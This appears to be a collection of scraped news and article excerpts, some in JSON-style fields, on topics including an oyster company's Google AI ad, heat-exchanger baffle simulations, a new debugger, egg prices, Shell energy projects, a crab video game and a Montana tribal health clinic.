economy], in the near term, this has proven not to be the case.\u201d\n\n(Ohio River Valley Institute is funded by the Heinz Endowments, which also funds The Allegheny Front.)",

Apparently, the answer is a Super Bowl commercial that spotlights how AI technology can benefit small businesses across the nation.\n\nFor those who don\u2019t know, Hog Island Oyster Co. is a beloved local oyster business that\u2019s been at the forefront of Marin\u2019s food scene since it was founded in the early 1980s.\n\nWhat began as an idea for a funky seasonal roadside oyster bar evolved into a culinary cultural staple of the Bay Area. Now, Hog Island will represent California\u2019s small businesses in a nationally televised Super Bowl commercial.\n\nHog Island Oyster Co. is one of only 50 businesses nationwide that was chosen to be featured in Google\u2019s 50 States, 50 Stories Super Bowl commercial. The commercial will air during the big game and can be watched locally as a community at the San Francisco Market (or at home on the TV).\n\n\u201cWe were pretty excited when Google approached us\u2014I mean, who wouldn\u2019t like to be in a Super Bowl commercial?\u201d said John Finger, founding partner and CEO of Hog Island Oyster Co. \u201c50 companies, 50 states, and we\u2019re the one in California that they wanted to work with.\u201d\n\n\u201cYou start a company because you\u2019re passionate about something, but you are not necessarily an expert in marketing or copywriting or building inventory tracking models,\u201d said Harris Beber, head of marketing for Google Workspace. \u201cThat\u2019s where AI should come in\u2014to help you do more of what you love, less of what you don\u2019t.\u201d\n\nSo, how exactly has Hog Island Oyster Co. used Google Workspace and Gemini AI to do more of what they love and less of what they don\u2019t? Well, as with all technology, it\u2019s all about how one integrates new technologies into the workplace, ideally to alleviate strenuous, time-intensive tasks.\n\nIn other words, the integration of new technology can act as a useful tool that allows small business employees the luxury of more time and energy for work they love while delegating taxing tasks to the tech.\n\nA great non-AI example of this kind of technological tool is Hog Island\u2019s use of tipping bags in their oyster growing process.\n\n\u201cOn the oyster growing front, the development of tipping bag culture has been a game changer in terms of tech,\u201d explained Finger. \u201cUsing the tide to tumble the oysters around\u2026creates a system where they hang down vertically in a low tide and the other direction in high tide. That\u2019s a big game changer for us because some of the stuff we used to do manually we\u2019re now having the tide do for us.\u201d\n\nBy harnessing the power of the tides through tipping bag technology, Hog Island lifted a portion of the manual labor from its employees. And, by assigning the environment itself to do the job of tumbling the oysters, still achieved the desired result of tumbling: to slow down the oyster growth and get deeper cups and firmer meat.\n\n\u201cOnce the oysters\u2026 are out in the bay, we\u2019re relying a lot on nature,\u201d Finger explained. \u201cThe food, water, oxygen flow\u2014it\u2019s all about the place, being keyed into a healthy estuary and about being mindful of our impacts.\u201d\n\n\u201cWe had looked at [using AI] a little bit, but it wasn\u2019t until Google approached us with Gemini that we really considered its benefits,\u201d added Finger.\n\nSo, what exactly are the benefits of Gemini in Hog Island\u2019s local small business, and where exactly do oysters and AI intersect? Well, it all comes down to the data. While human minds are extraordinary biological supercomputers capable of great feats, accessing and analyzing decades of data in order to detect and predict trends is still a time-consuming endeavor\u2014unless, of course, one has a computer smart enough to do it instead.\n\n\u201cOver the years, we\u2019ve had databases to track things like growing and inventory and weather patterns, and those data sets are our company\u2019s biggest assets,\u201d Finger explained. \u201cWe\u2019ve had all this data for years, but our big question was, how do we analyze all that?\u201d\n\n\u201cThat takes a lot of time if a person is doing it,\u201d Finger continued. \u201cRealizing that we can ask Gemini AI, \u2018Hey, if we plant this number of oysters here, when can we project that 75% of them are going to reach extra-small size?\u2019 and being able to get those answers without a huge amount of time, we\u2019re pretty excited about that.\u201d\n\nThrough the integration of Gemini into the Hog Island business model, West Marin\u2019s local oyster growers can now have the consistent upper hand in predicting restaurant needs through the year, manage inventory flow and streamline the supply chain to guarantee customer satisfaction with little waste. In turn, this leaves the experts more time to devote to the work they are truly passionate about, like interacting with the community and making/eating great oysters, of course.\n\n\u201cMy favorite oyster dish\u2026I really do like them raw; just the essence of ocean with a little bit of lemon on it is something else,\u201d Finger said. \u201cIf you cook them at all, I\u2019d say grilled oysters is the way to go, especially the harissa grilled oysters we do at Hog Island.\u201d\n\n\u201cIn the wintertime, our trademark Hog Island Sweetwater is complex umami-rich and has a little bit of a smoky rich finish to it,\u201d Finger continued. \u201cIn the summertime, I really like our Hog Island Atlantic\u2014it has a snappy brine to it and a minerality.\u201d\n\nAccording to Finger, the three biggest factors that determine an oyster\u2019s unique flavor and qualities are the type of oyster, the place it is grown and the hand that grew it.\n\n\u201cWe coach our team members on [oyster varietals] all the time\u2014it\u2019s a lot like wine,\u201d Finger explained. \u201cThis is our 42nd year in business, and having our origin in the \u201980s put us right at the time of the whole California food movement.\u201d\n\n\u201cThe folks at Hog Island are experts at what they do\u2014growing great oysters, and creating incredible experiences for the community,\u201d said Beber. \u201cWe love to see how they\u2019re using AI to help track and manage their inventory today, and we\u2019re so excited for how they continue using this technology in the future.\u201d\n\nWhatever exciting new technology is on the horizon for Hog Island, Finger asserts that the business model is and always will be based on two core principles: \u201cDo we have enough oysters, and do we have the right people?\u201d\n\n\u201c[Hog Island] is a people-intensive business,\u201d said Finger. \u201cSo, no, we won\u2019t be replacing our servers with robots. But can AI help us process information faster and more efficiently? Yes.\u201d\n\n\u201cWe have been part of the West Marin community forever, and we feel our ethos, beyond taking care of the environment, is taking care of the community we\u2019re part of,\u201d concluded Finger. \u201cOver the years, people have been saying we\u2019re in the fabric of the area, Marin County. It makes us really proud to think back on what we\u2019ve created and that anybody cares about that\u2014it\u2019s a cool thing.\u201d",

Six more baffles with various inclination degrees have been designed, since the Segmental baffle with a 0\u00b0 inclination angle is the first baffle examined in the article. The alternate baffles have an inclination of 5\u00b0-30\u00b0. This diversity in design allows for comparison and simulation, which makes choosing the best baffle easier. In the second part of this analysis, the number of baffles will be changed to determine how the selected ideal angle affects a STHE\u2019s performance. This section\u2019s findings hold true for shell-side Reynolds numbers for 0.5\u20132.5 kg/s mass flow rates, which are 6400\u201333,400.\n\nBaffle inclination effects on thermal efficiency\n\nFigure 6 demonstrates that OHT rises for all baffle inclination angles when the flow rate of hot fluid inlet the shell is increased. The highest overall heat transfer values in the shell are observed with baffles inclined at 30\u00b0, while baffles positioned at 0\u00b0 exhibit the lowest overall heat transfer values. Differences between different baffles\u2019 OHT values are not very noticeable at lower flow rates, but at larger flow rates, there is a noticeable discrepancy. Inclined baffles cause disturbance in the thermal boundary layer, hence intensifying the interfacial mixing of the shell-side fluid with tube surfaces. In local regions, the effect is most effective at 30\u00b0 where turbulence significantly increases OHT by 4.2% in comparison with non-inclined baffles with a mass flow rate of 1.5 kg/s.\n\nFig. 6 Relationship between OHT and mass flow rate for various baffle inclination angles in a STHE. Full size image\n\nBaffle inclination angle effect on shell side HTC\n\nAs depicted in Fig. 7 the shell-side HTC increasing by increment in the baffle inclination angle. In comparison to the baffle without inclination angle, the percentage of the raise in shell side HTC with an increase in the inclination angle of the baffles from 5\u00b0 to 30\u00b0 in the 1.5 kg/s mass flow rate are 1.42%, 3.97%, 5.13%, 6.044%, 10.8%, 24.85%, respectively. The discrepancy between the HTC values are not significant at low mass flow rates, but it has become more noticeable by rising in the mass flow rates. There is a clear correlation between the shell side HTC and turbulence of the fluid flow through the shell. According to Fig. 7, as the inclination angle of the baffles increased, the fluid\u2019s turbulence also rises, the HTC has consequently increased significantly.\n\nFig. 7 Relationship between shell-side HTC and mass flow rate for various baffle inclination angles in a STHE. Full size image\n\nPressure drop for different inclination angles of baffles\n\nBaffles in heat exchangers with a 30\u00b0 inclination experience a larger PD as a result of dead zones forming and obstructing fluid flow. Figure 8 demonstrates that as the flow rate inside the shell increases, the PD also rises; 30\u00b0 inclined baffles exhibit the highest PD, while Baffles positioned at 0\u00b0 exhibit the least PD, especially when flow rates are high, the distinct fluid flow pattern in 30\u00b0 inclined baffles significantly boost PD. Inclined baffles disrupt boundary layers-both thermal and those of the velocity-more effectively on the tube surfaces. The thickness of the boundary layer reduces, thereby increasing the convection heat transfer mechanism. The increase in pressure drop on the other hand is because of higher energy dissipation mechanisms due to frequent flow redirection.\n\nFig. 8 Relationship between PD and mass flow rate for various baffle inclination angles in a STHE. (shell side). Full size image\n\nBaffle inclination angle influence on cold water outlet temperature\n\nFigure 9 depicts the hot fluid mass flow rate versus the cold fluid outlet temperature at several baffle inclination angles for STHE. The primary role of baffles is the intensification of the fluid mixing due to flow disruptions and, thus, increased interaction of the hot fluid in the shell with the cold fluid in the tubes. The influence of increased thermal exchange is considerable, especially at higher values of the inclined angle: such effect produces high increases in the cold fluid\u2019s outlet temperatures at both 25\u00b0 and 30\u00b0. Figure 10a\u2013g shows that the cold fluid outlet of the tubes reaches its highest temperature with baffles inclined at 30\u00b0 and its lowest temperature with baffles inclined at 0\u00b0. It can be inferred that baffles with an angle of 30\u00b0 have the largest OHTs, whilst baffles with an angle of 0\u00b0 have the lowest. Temperature changes are now evident in the ends of tubes. Figure 11a\u2013g displays the temperature distribution within the STHE. As shown, the cold water at the tube\u2019s outlet sections has a higher temperature as a result of increasing the inclination angle of the baffles. The cold water\u2019s temperature rises in proportion to the number of higher temperature tubes at the outlet sections. When compared to the 0\u00b0 inclined baffles, the 25\u00b0 and 30\u00b0 inclined baffles exhibit the largest temperature variations at the outlet sections of the tubes.\n\nFig. 9 Relationship between cold water outlet temperature and mass flow rate for various baffle inclination angles in a STHE.

This metric is based on the HTC and PD, two crucial characteristics of STHEs, these findings are examined in more depth in the section on validating results. For each baffle inclination angle under investigation, the PEC has been calculated dependently. This ratio is defined as the amount of HTC divided by the PD and the basis of the comparison is 0\u00b0 inclined angle. Better overall performance is indicated by a higher PEC value; hence, baffles with higher heat transfer and lower PD are thought to be more effective than their counterparts. The investigation\u2019s best baffling layout has been established and successfully visualized through a comparison analysis of the data collected, thus showing how different angles may be the best solutions to improve heat exchanger efficiency. This method illustrates the vital importance of taking into account the flow resistance and the heat transfer capacities when it comes to choosing the best baffle design to achieve maximum efficiency in STHE applications. The end of the selection process serves not only to unravel the complex interactions between baffle geometry, fluid dynamics, and heat transfer performance but also to positively influence design decisions for next heat exchangers. The baffles with 25\u00b0 and 5\u00b0 inclination angles had the highest and lowest PEC values, respectively, as shown in Fig. 12. The 30\u00b0 inclined baffle has a far larger PD value than the other baffles. For baffles that are inclined 5\u00b0 to 30\u00b0, the numerical values of PEC are 1.024, 1.05, 1.072, 1.08, 1.106, 1.08 at 1.5 kg/s in comparison with 0\u00b0 inclined baffles.\n\nFig. 12 PEC (with the basis of 0\u00b0 inclined baffles) across inclination angle of baffles for different mass flow rates. (Shell-Side). Full size image\n\nApplying different quantities of 25\u00b0 angled baffles\n\nAn analysis of several baffles was carried out in the part before this one, which included a comparison of the contributing factors. In the end, the performance was used to determine which baffle inclination angle was the most effective. After using the simulation method to examine several baffle inclination angles in this investigation, the 25\u00b0 inclined baffle was found to be the best. The study examines several key parameters, including OHT, outlet temperatures of both hot and cold fluids, and PEC. In summary, the ideal quantity of 25\u00b0 inclined baffles are determined by a thorough analysis and comparison of the given data. There are 4 to 10 baffle amounts in the study. Figure 13a\u2013d displays STHE layouts with varying baffle counts, all set at a 25\u00b0 angle.\n\nFig. 13 STHE with various numbers of segmental baffles with 25\u00b0 inclination angle, (a) 4, (b) 6, (c) 8, (d) 10. Full size image\n\nImpact of 25\u00b0 inclined baffle count on OHT\n\nFigure 14 illustrates rising shell-side OHT as baffle count increases. The enhanced number of baffles boosts the OHT by intensifying the turbulent flow of fluid within the shell. In particular, the OHT values for setups with 4, 6, 8, and 10 baffles are recorded as 588.7, 636.83, 667.73, 690.95 W/m2 K, respectively, at 1.5 kg/s. The data indicates a significant 17.4% enhancement in heat transfer efficiency when baffle quantity is raised from 4 to 10. This correlation between OHT and baffle count can be attributed to the heightened turbulence and improved fluid mixing resulting from the additional baffles. The additional baffles are an excellent way to increase the interaction of the hot and cold fluids in the heat exchanger which in turn will lead to maximizing the surface area for the heat transfer. The boosted turbulence destroys the thermal boundary layer, making it possible to transfer heat more effectively. Hence, baffle quantity optimization in a STHE\u2019s configuration is the key to attaining the highest thermal performance. The results imply that increasing the baffle number has a lot of positive impacts on the heat transfer which is one of the main factors to be evaluated while designing and operating these systems.\n\nFig. 14 Correlation between OHT and mass flow rate in STHE with varying quantities of 25\u00b0 inclined baffle. (shell-side). Full size image\n\nImpact of 25\u00b0 inclined baffle count on shell-side HTC\n\nAccording to the Fig. 15, the shell-side HTC has likewise been increased as the number of the 25\u00b0 inclined baffles has grown. This phenomena is caused by decreasing the baffle spacing and the ongoing, sequential changes in the shell-side flow, which have raised the amount of flow\u2019s turbulence. At 1.5 kg/s mass flow rate, the shell-side HTC for four, six, eight and ten 25\u00b0 inclined baffles are 2588.2, 3246, 3705 and 4144 W/m2 K, respectively. The shell side HTC has grown in all simulated STHE in tandem with the mass flow rate increased. The HTC of the STHE with four, six, eight and ten 25\u00b0 inclined baffles has seen a 206.71%, 245.77%, 272.16% and 289.23% rise for mass flow rate from 0.5 to 2.5 kg/s.\n\nFig. 15 Correlation between shell side HTC and mass flow rate in STHE with varying quantities of 25\u00b0 inclined baffle. (shell-side). Full size image\n\nPD across varying quantities of 25\u00b0 angled baffles\n\nFigure 16 demonstrates that the PD rises in proportion to the increase in baffle quantity. The addition of more baffles, which reduces the gap between them, is associated with more frequent and sudden alterations in the fluid\u2019s trajectory within the shell. Consequently, this enhancement contributes to an elevated PD within the shell. Simultaneously, a higher shell fluid flow rate is noted, along with a more noticeable increase in PD. At a 1.5 kg/s flow rate, the PD values for baffles 4, 6, 8, and 10 are 5544, 7078, 9305.5, and 13,240 Pa, in that order. as 10 baffles are used at 1.5 kg/s, the PD is increased significantly, increasing by 138.8% as compared to 4 baffles.\n\nFig. 16 Relationship between PD and mass flow rate in a STHE with varying 25\u00b0 inclined baffle configurations. (shell-side). Full size image\n\nThermal characteristics of cold water discharge at 25\u00b0 baffle inclination angle\n\nFigure 17 demonstrates that the outlet temperature of the cold water in the tubes increases correlatively with both the quantity of baffles and the incoming flow rate of the heated water in STHE. This phenomenon is caused by the heightened OHT. A higher baffle count forces the fluid to change course more often, promoting better thermal exchange between the hot water and a greater tube surface. This process consequently elevates the temperature of the cold fluid flowing through the tubes. When the flow rate reaches 1.5 kg/s, the outlet temperature of the cold fluid for 4, 6, 8, and 10 baffles reaches 349.11, 350.43, 351.17, and 351.67 K, respectively. An analysis comparing the lowest and highest fluid temperatures reveals that the outlet temperature of the cold stream has risen by 0.73%. This increase is attributed to the combined effects of adding more baffles and elevating the mass flow rate of the heated fluid in the shell region. Figure 18a\u2013d illustrate the thermal profiles of both the heated and cold fluids, as well as their respective flow patterns within the STHE. The cold fluid\u2019s temperature inside the tubes has improved as a result of increasing the number of baffles, which caused the cold fluid to exhibit temperature variations earlier and before reaching the bent section, as indicated by the contours were obtained. The cold fluid exits the tubes at a higher temperature at the outlet section, which is another effect of this phenomenon. According to the Fig. 19(a-d), due to their greater length and more contact with the hot fluid, the four tubes which positioned horizontally at the top of the tube arrangement have demonstrated a higher temperature at the outlet section.\n\nFig. 17 Relationship between mass flow rate and cold fluid outlet temperature in the STHE. (shell-side). Full size image\n\nFig. 18 Thermal profiles along fluid pathways in the tube region, depicted for multiple 25\u00b0 inclined baffle arrangements, (a) 4, (b) 6, (c) 8, (d) 10.

Full size image\n\nImpact of increasing baffle count on fluid flow patterns\n\nThe results show velocity patterns of fluid flow in a STHE with 25\u00b0 angled baffles, ranging from four to ten baffles. As the number of baffles increases, significant flow patterns and velocity distribution changes have been observed. With fewer baffles, large areas of high-velocity flow exist between baffles, with some turbulence near them. As more baffles are added, the high-velocity regions become smaller and more frequent, while turbulent areas expand. The flow patterns gradually shift from slightly diagonal to more complex and intricate. With ten baffles, the flow becomes highly turbulent, with small, frequent high-velocity regions and the emergence of some low-velocity areas. Figure 20a\u2013d shows increasing the number of baffles leads to more complex and turbulent flow patterns throughout the exchanger. These changes in flow patterns as the number of baffles increases have several effects on the heat exchanger\u2019s performance. More baffles create a more even distribution of flow across the shell side, likely improving heat transfer by ensuring more fluid contacts the tubes. The increased frequency of velocity changes and higher turbulence enhance mixing, which can boost heat transfer efficiency. However, more baffles also increase the overall PD in the system, potentially requiring more pumping power. The increase in baffles also extends the effective flow path length, providing more opportunity for heat transfer but increasing fluid residence time. This complex interplay of factors means that the optimal number of baffles would depend on specific design requirements, balancing improved heat transfer performance against increased PD and pumping power needs.\n\nFig. 20 Velocity patterns of fluid flow, illustrated through streamlines, for varying numbers of 25\u00b0 angled baffles: (a) 4, (b) 6, (c) 8, (d) 10. (shell side). Full size image\n\nPEC for different numbers of 25\u00b0 inclined baffles\n\nSince PEC comprises the two most crucial STHE parameters\u2014HTC and PD\u2014it is the primary and most significant component in assessing STHE performance and selecting the optimal STHE. The PEC value increases with increased HTC and decreasing PD. Figure 21 shows that in a STHE with a flow rate of 1.5 kg/s, the PEC changes based on the number of baffles. The PEC values are 1.157, 1.206 and 1.203 for 6, 8, and 10 baffles respectively. The collected data suggests that among the various baffle configurations examined, the STHE equipped with eight baffles demonstrates superior performance compared to designs with different numbers of baffles. As depicted in Fig. 21, a remarkable finding emerges: STHE configured with 8 baffles exhibits peak performance at a flow rate of 2.5 kg/s. At this point in the simulation, it achieves an exceptionally high value of 1.24, which stands out as the maximum observed across all configurations tested.",

These programs have been around for a long time, developing alongside Linux and other UNIX-like OSs, and are still solidly in the CLI domain. Fed up with the lack of data structure support and these tools\u2019 staleness and user experience, [Jim] has created UScope, a new debugger written from scratch with no code from the existing projects.\n\nGBD, in particular, has quite a steep learning curve once you dig into its more advanced features. Many people side-step this learning curve by running GDB within Visual Studio or some other modern IDE, but it is still the same old debugger core at the end of the day. [Jim] gripes that existing debuggers don\u2019t support modern data structures commonly used and have poor customizability. It would be nice, for example, to write a little code, and have the debugger render a data structure graphically to aid visualisation of a problem being investigated. We know that GDB at least can be customised with Python to create application-specific pretty printers, but perhaps [Jim] has bigger plans?\n\nAnyway, Uscope currently supports only C and Zig, but work is in progress to add C++ and Go support, with plans for Rust, Odin and Jai. Time will tell whether they can gather enough interest to really drive development to support the more esoteric languages fully. Still, Rust at least has a strong support base, which might help get other people involved. It looks like early doors for this project, so time will tell whether it gets traction.

Kelly Hennessy, owner of the Six Corners Caf\u00e9, says she\u2019s implemented a $2 surcharge on breakfast items with eggs.\n\n\u201cWe live and die by eggs,\u201d she said during an interview with KATU. \u201cI was paying maybe $50 a case last year. Now I'm paying $150 a case,\u201d Hennessy said.\n\nBecause of that, she\u2019s had no other choice but to add an extra fee. Other have already announced they too will be implementing a surcharge on their breakfast items that contain eggs.\n\nHennessy says the surcharge isn\u2019t permanent and hopes as soon as the prices go down she can remove it.\n\n\u201cNothing is going down in price and this is a luxury for people to come and have breakfast,\u201d she explained.\n\nKATU's Shelby Slaughter visited several local stores to check on current egg prices, and found that a dozen eggs would cost shoppers anywhere from $3.49 to $7.49.\n\n.",

Following a break for maintenance, the drillship will resume drilling for Tullow at the start drilling of 2026.\n\nEarlier this week, Noble announced plans to divest the cold-stacked Pacific Meltem and Pacific Scirocco drillships from its fleet to eliminate costs related to these units and prioritize resources on the existing marketed fleet.

The new FPSO, operated by Shell, will become the new export route for the revamped oil and gas production, replacing the previous route via the Brent Charlie platform, which discontinued its operations in 2021.\n\nThe redevelopment program also involved drilling additional wells tied back to the new FPSO.\n\nSHEL\u2019s Expectations From the Penguins Field\n\nShell expects the peak production of around 45,000 barrels of oil equivalent per day (boe/d) from the Penguins field with an estimated recoverable resource volume of around 100 million boe. The field is also expected to produce enough gas to heat around 700,000 U.K. homes annually.\n\nCompared to Brent Charlie, the Penguins field is expected to have around 30% lower emissions and will extend the life of this key field by around 20 years, ensuring long-term contributions to the U.K.\u2019s energy supply.\n\nSHEL\u2019s Revamp to Enhance the U.K.\u2019s Energy Security\n\nAt present, the U.K. is dependent on imports to meet its oil and gas demands, and the Penguins field is a source of domestic oil and gas production that will satisfy the nation\u2019s energy needs. Although the extracted oil will be transported to refineries outside the U.K., these facilities supply refined products back to the country because of their limited refining capacities. Additionally, natural gas from Penguins will be transported through an existing pipeline to the St. Fergus gas terminal in Scotland, feeding into the U.K.\u2019s national gas network. This project highlights Shell\u2019s continued investment in competitive and lower-emission energy solutions.\n\nAn Insight Into Penguins Field\n\nThe Penguins field, discovered in 1974, previously produced oil and gas between 2003 and 2021. The field is 165 meters of water depth, around 150 miles northeast of the Shetland Islands. The Penguins Redevelopment will involve drilling approximately eight wells and include a modern FPSO (operated by Shell with a 50% holding).\n\nSHEL\u2019s Zacks Rank and Key Picks\n\nLondon-based Shell is one of the primary oil supermajors \u2014 a group of the U.S. and Europe-based big energy multinationals with operations that span almost every corner of the globe. Currently, SHEL has a Zacks Rank #3 (Hold).\n\nInvestors interested in the energy sector might look at some top-ranked stocks like SM Energy Company SM, Sunoco LP SUN and Gulfport Energy Corporation GPOR.While SM Energy and Sunoco currently sport a Zacks Rank #1 (Strong Buy) each, Gulfport Energy carries a Zacks Rank #2 (Buy).

            "content": "By Bruce Beaubouef, Managing Editor\n\nShell has reportedly exited the Atlantic Shores offshore wind project, saying that the project no longer fits its capabilities or the returns the company expected. Shell has reportedly written off its $1-billion investment in the project.\n\nThe Shell decision to \u201cback away\u201d from the project, as reported by the financial services firm Morningstar, came despite the project having received its Construction and Operations Plan approvals from the US Bureau of Ocean Energy Management (BOEM) on Oct. 1, 2024.\n\nAccording to Morningstar, Shell told the Associated Press that it is writing off the project because of increased competition, delays, and a changing market. President Trump\u2019s executive order likely played a role in this decision, strongly suggesting a less-friendly regulatory environment for US offshore wind over the next four years. \u201cNaturally we also take regulatory context into consideration,\u201d Shell\u2019s spokesperson Natalie Gunnell said in an email to the Associated Press.\n\nPresident Trump issued an Executive Order in January that paused offshore wind leasing on the US Outer Continental Shelf and mandated a review of the federal government\u2019s leasing and permitting practices for wind projects.\n\nShell owns half of the Atlantic Shores offshore wind development through a 50:50 joint venture with EDF Renewables, Atlantic Shores Offshore Wind, LLC.\n\nFollowing Shell\u2019s announcement, EDF said that it remained committed to advancing the Atlantic Shores project, which called for the construction of two offshore wind farms off the coast of Atlantic City.\n\nBut just days after Shell\u2019s announcement, the New Jersey Board of Public Utilities (NJBPU) announced that it had cancelled the bidding process for the state\u2019s fourth offshore wind solicitation, which had included the Atlantic Shores project.\n\nThe NJBPU cited uncertainty caused by recent federal actions and Shell\u2019s withdrawal from the Atlantic Shores offshore wind project. The state\u2019s fourth round of offshore wind solicitation was launched in May 2024, initially aimed at awarding between 1.2 GW and 4 GW of capacity.\n\nChristine Guhl-Sadovy, Board of Public Utilities President, said in a statement that two out of three bids had withdrawn, leaving Atlantic Shores as the only bidder. Corio, TotalEnergies and Rise Light & Power consortium, as well as RWE-National Grid venture Community Offshore Wind, had pulled out of the bidding process.\n\n\u201cA number of reasons led to this decision, notably Shell backing out as an equity partner in the Atlantic Shores project and backing away from the American clean energy market, as well as uncertainty driven by federal actions and permitting,\u201d said Guhl-Sadovy.\n\n\u201cThe Board concluded that an award in New Jersey\u2019s fourth offshore wind solicitation, despite the manifold benefits the industry offers to the state, would not be a responsible decision at this time.\u201d\n\nNew Jersey Governor Phil Murphy also said that he supports the NJBPU\u2019s decision on the fourth offshore wind solicitation, adding that the industry is currently dealing with numerous challenges.\n\n\u201cHowever, the offshore wind industry is currently facing significant challenges, and now is the time for patience and prudence,\u201d Murphy said. \u201cI support the BPU\u2019s decision on the fourth offshore wind solicitation, and I hope the Trump Administration will partner with New Jersey to lower costs for consumers, promote energy security, and create good-paying construction and manufacturing jobs.\u201d\n\nIn September 2022, Governor Murphy had signed an executive order that increased the state\u2019s offshore wind target for 2040 from 7.5 GW to 11 GW.",

            "content": "Canadian Natural Resources Limited CNQ and Shell Canada, an affiliate of Shell plc SHEL, have agreed on an asset swap transaction relating to the transfer of a working interest in the Athabasca Oil Sands Project (AOSP).\n\nThe deal is expected to close by the first quarter of 2025, subject to certain regulatory approvals.\n\nThe Asset Swap Deal\n\nAccording to the deal, CNQ will trade 10% of its working interest in the Scotford Upgrader and Quest Carbon Capture and Storage facilities in exchange for Shell\u2019s 10% working interest in the AOSP mines, associated reserves and additional working interests in some other non-producing oil sands leases.\n\nAs a result of this deal, CNQ will acquire 100% working interest in the AOSP assets, resulting in an increase in its production capacity by approximately 31,000 barrels per day (bbl/d) and will retain 80% working interest in the Scotford Upgrader and Quest facilities. The deal does not involve any cash exchange except for certain closing adjustments.\n\nHow Will the Deal Benefit CNQ?\n\nCanadian Natural, currently carrying a Zacks Rank #3 (Hold), is well positioned with its long-life, low-decline assets combined with operational efficiency that continues to generate significant free cash flow for decades.\n\nYou can see the complete list of today\u2019s Zacks #1 Rank (Strong Buy) stocks here.\n\nThis transaction will further enhance CNQ\u2019s diversified sales strategy by meeting the commitment of 169,000 bbl/d on the Trans Mountain Expansion pipeline and 87,500 bbl/d to the U.S. Gulf Coast and providing access to global markets.\n\nWhile this asset swap was not included in Canadian Natural\u2019s initial 2025 production guidance, the company plans to revise its outlook once the deal is finalized.\n\nKey Picks\n\nInvestors interested in the energy sector might look at some top-ranked stocks like SM Energy Company SM and Sunoco LP SUN.\n\nDenver, CO-based SM Energy Company is an independent oil and gas company engaged in the exploration, exploitation, development, acquisition and production of natural gas and crude oil in North America.

It\u2019s not a game where you will find yourself dying often or falling for extremely challenging moments.\n\nA Home Below starts you off in an abandoned underwater house. There isn\u2019t much explanation at first about what has happened, but through looking at books and papers that are left around, you\u2019ll find that the world has been losing its animals and falling into the ocean. That\u2019s what has happened here.\n\nYou can travel around the level in order to find the next shell to take you further. From a shot glass to a bottle cap, you\u2019ll gain new abilities that can help you. One shell allowed me to glide through to the next area, getting slightly higher. You can often see different shells using your vision, but you can pick up little accessories for your shells as well.\n\nAs you explore the world, you can find yourself making friends with other creatures within the ocean, evading predators by staying still and finding food that you can eat up. It\u2019s interesting to see how the world has changed and how crabs have adapted. Speaking with developers after playing the game at Pocket Gamer Connects London, they explained that there was a lot of research being put into this game to provide a realistic experience of crabs adapting to their enviroment.\n\nThere is something truly charming about the graphic style and the ability to be playing as a little crab just exploring the ruins of civilization.

This comes as developers grapple with inflation, surging material costs and increasing difficulty securing long-term agreements to sell electricity at competitive prices.

Send your news and tips to mhudson@montanafreepress.org.\n\nClinic ownership would nearly triple tribal workforce\n\nThe sign out front says \u201cLittle Shell Tribal Health Clinic,\u201d but it\u2019s the federal Indian Health Service that calls the shots at the Great Falls facility.\n\nThat isn\u2019t to say that the clinic was unwelcome. The opening of the health center in 2022 was a big step for the burgeoning Little Shell Tribe, whose members previously had to travel hundreds of miles to be served by another tribal health clinic. The facility is culturally reflective of the Little Shell, and a portrait of Ayabe-Way-We-Tung, a former chief of the Little Shell Tribe of Chippewa Indians, looms above the main lobby.\n\nNow, the tribe is embarking on an effort to take control of its clinic, forgoing much of the federal bureaucracy.\n\n\u201cI\u2019m a true believer that all tribes should move to self-governance,\u201d tribal Chairman Gerald Gray told Montana Free Press. \u201cThat means running stuff yourself instead of having the federal government always doing that for you. It doesn\u2019t mean they aren\u2019t going to be there along the way. They\u2019re always involved.\u201d\n\nThe transition is long and bureaucratic, but Gray believes the tribe is poised to take ownership of the facility and improve hiring and health care practices. The clinic, which has about 40 employees, doesn\u2019t currently have a staff doctor, Gray said. Doctors from the Crow and Blackfeet tribes have come to lend temporary help.\n\nGray said the clinic has asked IHS to temporarily freeze hiring until the Little Shell can take over. He said the IHS hiring process, a mechanism of the federal government, is also a long and difficult process. Under Little Shell ownership, Gray said the tribe will be able to streamline hiring and offer more attractive compensation packages.\n\n\u201cOnce we assume the clinic, it doesn\u2019t become a government system,\u201d Gray said. \u201cIt\u2019s really awkward. Some will want to move on, to stay with another IHS facility.\u201d\n\nOthers will either be rehired as tribal employees or work through a sort of hybrid program that allows federal government employees to work for local governments or tribal governments, Gray said.\n\nOnce completed, the clinic acquisition will be a massive human resources endeavor for the tribe, nearly tripling the number of its employees.\n\nThe IHS media office did not respond to requests for comment. An auto-reply email said the agency has paused communications, which is part of a Trump administration directive across federal health agencies. The IHS tribal self-governance contact also declined to answer questions.\n\nTwo Montana tribes have gone through the IHS self-governance process: the Confederated Salish and Kootenai Tribes of the Flathead Nation and the Chippewa Cree Tribe of the Rocky Boy\u2019s Reservation.\n\nGray said the clinic will model its care structure from Nuka, a holistic health care philosophy championed by Indigenous groups in Alaska. The Nuka model incorporates mental, spiritual, emotional and physical wellness and takes an integrative approach to health care visits and guidance.\n\nThe Little Shell will negotiate the transition with IHS over the coming months. Gray hopes to reopen under tribal ownership in July.\n\nLegislative Update\n\nGreat Falls This Week isn\u2019t usually the place to read about the Montana Legislature (check out Capitolized for that), but one bill caught my attention.\n\nState Sen. Jeremy Trebas (R-Great Falls) sponsored a bill that would prevent county-level governments from removing election administration duties from the county clerk and recorder. That exact scenario played out a year ago in Cascade County, and Trebas told MTFP that his bill resulted from those events.\n\n\u201cEven though it stems from one issue, I think it\u2019s good policy across Montana,\u201d he said on Thursday.\n\nThe bill, SB 128, stipulates that counties may not remove election duties from a clerk and recorder during their term in office. Counties could, however, make the change for a future term of office, and clerks and recorders can voluntarily give up those duties, according to the bill draft.\n\nIf passed, the law wouldn\u2019t be retroactive and wouldn\u2019t change the current election administration in Cascade County, which is overseen by appointed department leader Terry Thompson. The law would apply to counties that haven\u2019t designated an elections administrator separate from the elected clerk and recorder office.\n\nIn most Montana counties, election administration still falls under the clerk and recorder, an elected position. The only counties with appointed election administrators separate from the clerk and recorder office are Cascade, Yellowstone, Missoula, Lincoln, Lake, Glacier and Big Horn counties.\n\nTrebas\u2019 bill passed out of a local government committee and has yet to reach a full Senate vote.\n\nPhoto Op\n\nCredit: Matt Hudson/MTFP\n\nOn Jan. 27, two C-130 Hercules planes made circles around Great Falls as part of a training exercise for the Montana Air National Guard\u2019s 120th Airlift Wing. The massive, 132-foot wingspan aircraft made several touch-and-go landings at Great Falls International Airport.\n\nCalling all photographers: Submit a photo for Great Falls This Week to mhudson@montanafreepress.org.\n\nThe Gist\n\nReporters across the country, including those at Montana Free Press, 